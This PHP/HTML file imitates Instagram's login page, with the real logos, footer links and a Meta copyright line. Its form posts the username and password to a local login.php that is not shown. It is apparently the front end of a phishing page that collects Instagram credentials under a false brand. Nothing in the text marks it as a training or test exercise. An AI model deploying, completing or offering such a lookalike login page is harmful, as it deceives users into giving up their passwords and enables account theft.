<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram</title>
  <link rel="stylesheet" href="style.php" />
</head>
<body>
  <div class="container">
    <div class="login-box">
      <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram" />
      </div>

      <?php if (isset($_GET['error'])): ?>
        <div class="error-msg"><?= htmlspecialchars($_GET['error']) ?></div>
      <?php endif; ?>

      <form action="login.php" method="POST" class="login-form" autocomplete="off">
        <input type="text" name="username" placeholder="Phone number, username, or email" required />
        <input type="password" name="password" placeholder="Password" required />
        <button type="submit">Log In</button>
      </form>

      <div class="divider">
        <div class="line"></div>
        <div class="or">OR</div>
        <div class="line"></div>
      </div>

      <!-- Google Login Button -->
      <a href="#" class="google-login">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google Logo" />
       Login with Google
      </a>

      <!-- Facebook Login Button -->
      <a href="https://facebook.com/login" class="social-login facebook-login">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook logo" />
        <span>Login with Facebook</span>
      </a>

      <a href="#" class="forgot-password">Forgot password?</a>

      <div class="signup-box">
        Don't have an account? <a href="#">Sign up</a>
      </div>
    </div>

    <div class="get-app">
      <p>Get the app.</p>
      <div class="app-buttons">
        <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v4/yt/r/Yfc020c87j0.png" alt="App Store" /></a>
        <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" alt="Google Play" /></a>
      </div>
    </div>

    <footer>
      <nav class="footer-links">
	<a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Help</a><a href="#">Privacy</a><a href="#">Teams</a><a href="#" > Locations </a><a href="#" >Instagram Lite</a><a href="#" >Threads </a>

      </nav>
      <p>© 2025 Instagram from Meta</p>
    </footer>
  </div>
</body>
</html>

